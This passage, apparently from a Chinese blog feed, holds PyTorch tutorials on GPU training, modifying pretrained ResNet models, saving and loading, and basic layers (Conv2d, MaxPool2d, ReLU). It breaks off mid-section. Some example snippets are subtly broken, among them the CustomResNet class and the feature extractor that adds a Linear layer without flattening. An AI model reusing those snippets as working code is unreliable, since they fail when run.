函数返回两个值：一是实际的最大值，二是这个最大值对应的索引。在这里，outputs.data 是模型的输出，1 表示函数将沿着索引为1的维度（即每个输出向量的维度）寻找最大值，这通常对应于类别概率的向量。</span><br>        _, predicted = torch.<span class="hljs-built_in">max</span>(outputs.data, <span class="hljs-number">1</span>)<br>        total += labels.size(<span class="hljs-number">0</span>)<br>        correct += (predicted == labels).<span class="hljs-built_in">sum</span>().item()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Accuracy of the network on the 10000 test images: %d %%&#x27;</span> % (<br>    <span class="hljs-number">100</span> * correct / total))<br></code></pre></td></tr></table></figure><p>这个例子首先加载并预处理 CIFAR-10数据集，然后定义一个简单的卷积神经网络，接着设置交叉熵损失函数和 SGD优化器。在训练阶段，网络在训练数据上进行多轮迭代，每轮迭代中通过前向传播计算损失，然后通过反向传播更新网络参数。最后，评估网络在测试集上的性能。</p><h1 id="利用gpu训练">2. 利用GPU训练</h1><p>在PyTorch中使用GPU进行神经网络训练主要包括以下几个步骤：</p><h2 id="检查gpu可用性">2.1 检查GPU可用性</h2><p>首先，确保您的系统中有可用的CUDA支持的GPU，并且PyTorch已经正确安装。可以使用以下代码来检查是否有可用的GPU：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-keyword">if</span> torch.cuda.is_available():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CUDA is available. Training on GPU.&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CUDA is not available. Training on CPU.&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="指定设备">2.2 指定设备</h2><p>创建一个设备对象，这样您就可以在需要时将张量和模型移动到该设备上。如果有可用的CUDA设备，这通常会被设置为"cuda"，否则回退到"cpu"。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">device = torch.device(<span class="hljs-string">&quot;cuda&quot;</span> <span class="hljs-keyword">if</span> torch.cuda.is_available() <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;cpu&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="将模型移动到指定设备">2.3 将模型移动到指定设备</h2><p>在开始训练之前，您需要将您的模型移动到之前指定的设备上。这可以通过调用<code>.to(device)</code>方法来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">model = MyModel()  <span class="hljs-comment"># 假设MyModel是您定义的模型类</span><br>model.to(device)<br></code></pre></td></tr></table></figure><h2 id="将数据移动到指定设备">2.4 将数据移动到指定设备</h2><p>在训练过程中，确保您的数据（输入张量和目标张量）也被移动到了正确的设备上。这通常在数据加载循环中完成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> inputs, labels <span class="hljs-keyword">in</span> dataloader:  <span class="hljs-comment"># 假设dataloader是您的数据加载器</span><br>    inputs, labels = inputs.to(device), labels.to(device)<br>    <br>    <span class="hljs-comment"># 在这里执行前向传播、计算损失、反向传播和优化器步骤</span><br></code></pre></td></tr></table></figure><h2 id="训练循环">2.5 训练循环</h2><p>在训练循环中，您会执行前向传播、损失计算、反向传播和优化步骤。确保所有的这些操作都在GPU上执行，以便加速训练过程。</p><h2 id="监控性能和调优">2.6 监控性能和调优</h2><p>使用GPU进行训练通常会大大加快速度，但也要注意监控性能并进行必要的调优，比如调整批量大小和学习率，以确保您充分利用了GPU资源。</p><p>这些步骤提供了使用PyTorch在GPU上进行神经网络训练的基本框架。在实际应用中，您可能还需要考虑其他因素，如数据并行处理、更复杂的模型结构调整和性能优化技巧。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Pytorch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网络模型</title>
    <link href="/2024/03/05/Python/PyTorch/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/"/>
    <url>/2024/03/05/Python/PyTorch/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>PyTorch 提供了一个名为 torchvision的库，其中包含了许多预训练的网络模型，如 ResNet、VGG 和 AlexNet等，可以用于图像分类、目标检测等任务。这些模型可以直接使用，也可以根据特定任务的需求进行修改。此外，PyTorch提供了简单的 API来保存和加载模型。下面是一个简单的例子，展示了如何使用、修改、保存和加载一个预训练的ResNet 模型：</p><h1 id="使用预训练模型">1. 使用预训练模型</h1><p>首先，我们需要导入必要的库并加载一个预训练的模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision.models <span class="hljs-keyword">as</span> models<br><br><span class="hljs-comment"># 加载预训练的 ResNet18 模型</span><br>model = models.resnet18(pretrained=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h1 id="修改模型">2. 修改模型</h1><p>在深度学习中，修改预训练模型以适应特定任务是一种常见且有效的策略。PyTorch提供了灵活的方式来修改模型，以下是一些常见的方法和技巧：</p><h2 id="替换模型中的特定层">2.1 替换模型中的特定层</h2><p>你可以直接替换模型中的特定层，以适应新的数据集或任务。这通常用于修改模型的输出层，以匹配新任务的类别数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">num_ftrs = model.fc.in_features<br>model.fc = nn.Linear(num_ftrs, new_class_num)<br></code></pre></td></tr></table></figure><h2 id="添加额外的层或模块">2.2 添加额外的层或模块</h2><p>有时，你可能希望在现有模型的基础上添加额外的层或模块，以增强模型的能力或适应特定的数据处理需求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomResNet</span>(models.ResNet):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-built_in">super</span>(CustomResNet, self).__init__(*args, **kwargs)<br>        self.extra_layer = nn.Sequential(<br>            nn.ReLU(),<br>            nn.Dropout(<span class="hljs-number">0.5</span>),<br>            nn.Linear(in_features=self.fc.out_features, out_features=<span class="hljs-number">100</span>)<br>        )<br>        self.fc = nn.Linear(<span class="hljs-number">100</span>, new_class_num)  <span class="hljs-comment"># 假设新的类别数为 new_class_num</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = <span class="hljs-built_in">super</span>(CustomResNet, self).forward(x)<br>        x = self.extra_layer(x)<br>        x = self.fc(x)<br>        <span class="hljs-keyword">return</span> x<br><br><span class="hljs-comment"># 使用自定义的模型</span><br>model = CustomResNet(models.resnet50(pretrained=<span class="hljs-literal">True</span>))<br></code></pre></td></tr></table></figure><h2 id="冻结部分层的权重">2.3 冻结部分层的权重</h2><p>在迁移学习中，常常需要冻结模型的一部分，特别是在训练数据相对较少时，以防止过拟合。冻结权重意味着在训练过程中这些权重不会更新。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 冻结除最后全连接层之外的所有层的权重</span><br><span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> model.parameters():<br>    param.requires_grad = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 解冻最后的全连接层</span><br><span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> model.fc.parameters():<br>    param.requires_grad = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><h2 id="修改卷积层的步长或填充">2.4 修改卷积层的步长或填充</h2><p>有时，为了适应特定大小的输入数据，你可能需要修改卷积层的步长(stride)或填充(padding)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 修改模型第一层的步长和填充</span><br>model.conv1.stride = (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>model.conv1.padding = (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="使用预训练模型作为特征提取器">2.5使用预训练模型作为特征提取器</h2><p>你可以将预训练模型的某一部分作为特征提取器，而不需要对其进行训练。这通常涉及到移除模型的最后几层，并将其余部分用作固定的特征提取器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 移除模型的最后一层</span><br>model = models.resnet18(pretrained=<span class="hljs-literal">True</span>)<br>model = nn.Sequential(*<span class="hljs-built_in">list</span>(model.children())[:-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># 在此基础上添加自定义层</span><br>model.add_module(<span class="hljs-string">&#x27;custom_fc&#x27;</span>, nn.Linear(<span class="hljs-number">512</span>, new_class_num))<br>model.add_module(<span class="hljs-string">&#x27;softmax&#x27;</span>, nn.Softmax(dim=<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h1 id="训练模型">3. 训练模型</h1><p>虽然这里不展开训练过程的详细代码，但训练模型通常涉及定义损失函数和优化器，然后在训练数据上迭代模型的前向和后向传播：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义损失函数和优化器</span><br>criterion = nn.CrossEntropyLoss()<br>optimizer = torch.optim.SGD(model.parameters(), lr=<span class="hljs-number">0.001</span>, momentum=<span class="hljs-number">0.9</span>)<br><br><span class="hljs-comment"># 训练代码（示意）</span><br><span class="hljs-comment"># for inputs, labels in dataloader:</span><br><span class="hljs-comment">#     optimizer.zero_grad()</span><br><span class="hljs-comment">#     outputs = model(inputs)</span><br><span class="hljs-comment">#     loss = criterion(outputs, labels)</span><br><span class="hljs-comment">#     loss.backward()</span><br><span class="hljs-comment">#     optimizer.step()</span><br></code></pre></td></tr></table></figure><h1 id="保存模型">4. 保存模型</h1><p>训练完成后，可以通过两种方式保存模型：仅保存模型参数或保存整个模型。</p><p><strong>仅保存模型参数</strong>（推荐方式）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.save(model.state_dict(), <span class="hljs-string">&#x27;model_weights.pth&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>保存整个模型</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.save(model, <span class="hljs-string">&#x27;model_complete.pth&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="加载模型">5. 加载模型</h1><p>加载模型时，也需要区分是加载模型参数还是加载整个模型。</p><p><strong>加载模型参数</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">model = models.resnet18(pretrained=<span class="hljs-literal">False</span>)  <span class="hljs-comment"># 先实例化模型</span><br>model.fc = nn.Linear(num_ftrs, <span class="hljs-number">10</span>)  <span class="hljs-comment"># 重建最后的全连接层</span><br>model.load_state_dict(torch.load(<span class="hljs-string">&#x27;model_weights.pth&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>加载整个模型</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">model = torch.load(<span class="hljs-string">&#x27;model_complete.pth&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这个流程展示了如何在 PyTorch中使用、修改、保存和加载网络模型。这些操作在进行深度学习实验和项目时非常常见，特别是当需要调整预训练模型以适应新任务时。通过这种方式，可以利用已有的模型架构和权重，加速模型的训练和开发过程。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Pytorch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>神经网络</title>
    <link href="/2024/03/04/Python/PyTorch/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    <url>/2024/03/04/Python/PyTorch/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="容器">1. 容器</h1><h2 id="module">1.1 Module</h2><p>PyTorch的神经网络基本骨架是通过构建<code>torch.nn.Module</code>子类来完成的。这个基本骨架定义了神经网络的结构以及它如何进行前向传播和反向传播。</p><p>以下是一个简单的PyTorch神经网络模型的基本骨架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModel</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MyModel, self).__init__()<br>        <span class="hljs-comment"># 在这里定义网络的各个层</span><br>        <br>        self.layer1 = nn.Linear(input_size, hidden_size)<br>        self.activation = nn.ReLU()<br>        self.layer2 = nn.Linear(hidden_size, output_size)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-comment"># 前向传播逻辑</span><br>        <br>        x = self.layer1(x)<br>        x = self.activation(x)<br>        x = self.layer2(x)<br>        <br>        <span class="hljs-keyword">return</span> x<br></code></pre></td></tr></table></figure><p>在这个基本骨架中，<code>MyModel</code>类继承了<code>nn.Module</code>类。在<code>__init__</code>方法中，你可以定义神经网络的各个层。在<code>forward</code>方法中，定义了数据在网络中的前向传播路径。</p><ul><li><code>nn.Linear</code>定义了一个线性层，即全连接层，其中的参数是输入维度和输出维度。</li><li><code>nn.ReLU</code>是激活函数，可以用于增加网络的非线性特性。</li></ul><p>你可以根据你的具体任务和网络结构需求来添加更多的层和操作。</p><h2 id="sequential">1.2 Sequential</h2><p><code>torch.nn.Sequential</code> 是 PyTorch中的一个容器模块，用于构建神经网络的序列模型。它可以按顺序组合多个神经网络层（如线性层、激活函数、池化层等），构建一个完整的神经网络模型。</p><p>通过<code>torch.nn.Sequential</code>，可以简单地按顺序堆叠多个层，使得神经网络的构建更加简洁和易读。</p><p>以下是一个简单的示例，演示了如何使用 <code>torch.nn.Sequential</code>来构建一个简单的神经网络模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 定义一个简单的神经网络模型</span><br>model = nn.Sequential(<br>    nn.Linear(<span class="hljs-number">784</span>, <span class="hljs-number">128</span>),  <span class="hljs-comment"># 输入特征数量为 784，输出特征数量为 128 的线性层</span><br>    nn.ReLU(),             <span class="hljs-comment"># ReLU 激活函数</span><br>    nn.Linear(<span class="hljs-number">128</span>, <span class="hljs-number">64</span>),    <span class="hljs-comment"># 输入特征数量为 128，输出特征数量为 64 的线性层</span><br>    nn.ReLU(),             <span class="hljs-comment"># ReLU 激活函数</span><br>    nn.Linear(<span class="hljs-number">64</span>, <span class="hljs-number">10</span>)      <span class="hljs-comment"># 输入特征数量为 64，输出特征数量为 10 的线性层</span><br>)<br><br><span class="hljs-comment"># 创建一个示例输入张量</span><br>input_tensor = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">784</span>)  <span class="hljs-comment"># batch_size=1, input_features=784</span><br><br><span class="hljs-comment"># 将输入张量传递给模型进行前向传播</span><br>output_tensor = model(input_tensor)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output tensor shape:&quot;</span>, output_tensor.shape)<br></code></pre></td></tr></table></figure><p>在这个示例中，我们使用 <code>torch.nn.Sequential</code>构建了一个简单的神经网络模型，它包含了三个线性层和两个 ReLU激活函数。每个线性层的输入特征数量和输出特征数量依次是 (784, 128)、(128,64) 和 (64, 10)。然后，我们创建了一个输入张量<code>input_tensor</code>，形状为<code>(1, 784)</code>，表示一个批量大小为 1，输入特征数量为 784的张量。最后，将输入张量传递给模型进行前向传播，得到输出张量<code>output_tensor</code>，其形状为<code>(1, 10)</code>，表示一个批量大小为 1，输出特征数量为 10的张量。</p><h1 id="卷积层">2. 卷积层</h1><p><code>torch.nn.Conv2d</code>是PyTorch中用于创建二维卷积层的类。二维卷积层通常用于处理图像数据，它可以通过滤波器（也称为卷积核）从输入图像中提取特征。这些特征可以用于各种任务，如图像分类、目标检测、图像分割等。</p><p>下面是<code>torch.nn.Conv2d</code>的基本用法和参数解释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 示例</span><br>conv = nn.Conv2d(in_channels, out_channels, kernel_size, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">0</span>, dilation=<span class="hljs-number">1</span>, groups=<span class="hljs-number">1</span>, bias=<span class="hljs-literal">True</span>, padding_mode=<span class="hljs-string">&#x27;zeros&#x27;</span>, device=<span class="hljs-literal">None</span>, dtype=<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># 参数：</span><br><span class="hljs-comment"># in_channels ( int ) – 输入图像中的通道数。对于RGB图像，通道数为3。</span><br><span class="hljs-comment"># out_channels ( int ) – 卷积产生的通道数。</span><br><span class="hljs-comment"># kernel_size ( int或tuple ) – 卷积核的大小，可以是一个整数，表示正方形卷积核的边长；也可以是一个元组，表示卷积核的高度和宽度。</span><br><span class="hljs-comment"># stride ( int或tuple，可选) – 卷积的步幅。默认值：1</span><br><span class="hljs-comment"># padding（int、tuple或str，可选） – 添加到输入的所有四个边的填充。默认值：0</span><br><span class="hljs-comment"># padding_mode（str，可选）– &#x27;zeros&#x27;、&#x27;reflect&#x27;或 &#x27;replicate&#x27;。&#x27;circular&#x27;默认：&#x27;zeros&#x27;</span><br><span class="hljs-comment"># dilation ( int或tuple，可选) – 内核元素之间的间距。默认值：1。当dilation&gt;1时，卷积核中的元素不是相邻的，而是隔开一定的距离。</span><br><span class="hljs-comment"># groups ( int ,可选) – 从输入通道到输出通道的阻塞连接数。默认值：1</span><br><span class="hljs-comment"># bias ( bool ,可选) – 如果为True，则向输出添加可学习的偏差。默认：True</span><br><br><span class="hljs-comment"># 示例：</span><br><span class="hljs-comment"># 创建一个具有3个输入通道，输出通道数为16，卷积核大小为3x3的卷积层</span><br>conv = nn.Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">16</span>, kernel_size=<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>一旦创建了<code>Conv2d</code>层，你就可以将输入数据传递给它进行前向计算，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-comment"># 创建输入数据（batch_size, channels, height, width）</span><br>input_data = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>)  <span class="hljs-comment"># 一个大小为32x32的RGB图像，batch size为1</span><br><br><span class="hljs-comment"># 将数据传递给卷积层</span><br>output_data = conv(input_data)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output shape:&quot;</span>, output_data.shape)<br></code></pre></td></tr></table></figure><p>这将输出经过卷积层后得到的特征图的形状。</p><h1 id="池化层">3. 池化层</h1><p><code>torch.nn.MaxPool2d</code> 是 PyTorch中用于执行二维最大池化操作的模块。最大池化是一种常用的降采样技术，用于减小图像或特征图的空间尺寸，同时保留最重要的特征。</p><p>这个模块会将输入的二维数据（通常是特征图）按照给定的窗口大小，在每个窗口上取最大值作为输出。在深度学习中，通常用于在卷积神经网络（CNN）的卷积层后进行特征图的降维和特征提取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.nn.MaxPool2d(kernel_size, stride=<span class="hljs-literal">None</span>, padding=<span class="hljs-number">0</span>, dilation=<span class="hljs-number">1</span>, return_indices=<span class="hljs-literal">False</span>, ceil_mode=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># 参数：</span><br><span class="hljs-comment"># kernel_size ( Union [ int , Tuple [ int , int ] ] ) – 取最大值的窗口大小</span><br><span class="hljs-comment"># stride ( Union [ int , Tuple [ int , int ] ] ) – 窗口的步幅。默认值为kernel_size</span><br><span class="hljs-comment"># padding ( Union [ int , Tuple [ int , int ] ] ) – 在两侧添加隐式负无穷大填充</span><br><span class="hljs-comment"># dilation ( Union [ int , Tuple [ int , int ] ] ) – 控制窗口中元素步幅的参数</span><br><span class="hljs-comment"># return_indices ( bool ) – if True，将返回最大索引以及输出。torch.nn.MaxUnpool2d以后有用</span><br><span class="hljs-comment"># ceil_mode ( bool ) – 当为True时，将使用ceil而不是floor来计算输出形状，ceil即2.31取3</span><br></code></pre></td></tr></table></figure><p>使用 <code>MaxPool2d</code>可以有效地减小特征图的维度，并且在一定程度上提取出图像的重要特征，从而帮助神经网络更好地学习和泛化。以下是一个简单的示例，展示了如何在一个卷积神经网络中使用<code>MaxPool2d</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 定义输入张量（batch_size=1, channels=1, height=4, width=4）</span><br>input_tensor = torch.tensor([[<br>    [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>],<br>     [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>],<br>     [<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>],<br>     [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>]]<br>]])<br><br><span class="hljs-comment"># 定义池化层</span><br>pool_layer = nn.MaxPool2d(kernel_size=<span class="hljs-number">2</span>, stride=<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 将输入张量传递给池化层进行池化操作</span><br>output = pool_layer(input_tensor)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input shape:&quot;</span>, input_tensor.shape)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output shape:&quot;</span>, output.shape)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output tensor:&quot;</span>)<br><span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p>在这个示例中，我们定义了一个输入张量<code>input_tensor</code>，它的形状是<code>(1, 1, 4, 4)</code>，表示一个单通道（灰度图）的图像，尺寸为4x4。然后，我们定义了一个 <code>MaxPool2d</code> 池化层，设置了<code>kernel_size=2</code> 和 <code>stride=2</code>，表示使用 2x2的池化窗口，步幅也是 2。</p><p>将输入张量传递给池化层后，输出的形状变为<code>(1, 1, 2, 2)</code>，表示经过池化操作后的特征图尺寸为2x2。同时，输出的张量内容就是在每个 2x2 的窗口中取的最大值。</p><h1 id="非线性激活">4. 非线性激活</h1><h2 id="relu">4.1 ReLU</h2><p><code>torch.nn.ReLU</code> 是 PyTorch中的激活函数模块，用于实现修正线性单元（Rectified LinearUnit，ReLU）激活函数。ReLU是深度学习中最常用的激活函数之一，其数学表达式为： <spanclass="math display">\[\text{ReLU}(x) = \max(0, x)\]</span> 这意味着对于输入 ( x )，如果 ( x )大于等于零，则激活函数输出与输入相同，如果 ( x )小于零，则输出为零。</p><p>使用 ReLU激活函数的主要原因是它能够解决梯度消失问题，并且计算速度较快。此外，ReLU的输出范围是 <span class="math inline">\([0,+\infty)\)</span>，没有上限，这有助于网络的非线性建模能力。</p><p>下面是一个简单的示例展示了如何在 PyTorch 中使用<code>torch.nn.ReLU</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 创建一个输入张量</span><br>input_tensor = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 示例输入张量的形状为 (2, 3)</span><br><br><span class="hljs-comment"># 创建一个 ReLU 激活函数实例</span><br>relu = nn.ReLU()<br><br><span class="hljs-comment"># 将输入张量传递给 ReLU 激活函数进行激活操作</span><br>output_tensor = relu(input_tensor)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input tensor:&quot;</span>)<br><span class="hljs-built_in">print</span>(input_tensor)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output tensor after ReLU activation:&quot;</span>)<br><span class="hljs-built_in">print</span>(output_tensor)<br></code></pre></td></tr></table></figure><p>在这个示例中，我们首先创建了一个输入张量<code>input_tensor</code>，形状为<code>(2, 3)</code>。然后，我们创建了一个 ReLU 激活函数的实例<code>relu</code>，并将输入张量传递给这个激活函数进行激活操作。最后，输出的张量<code>output_tensor</code> 就是经过 ReLU 激活函数处理后的结果。</p><p>值得注意的是，对于输入张量中的每个元素，如果元素的值小于零，经过 ReLU激活后会变成零；如果元素的值大于等于零，激活函数会保持不变。</p><h2 id="sigmoid">4.2 Sigmoid</h2><p><code>torch.nn.Sigmoid</code> 是 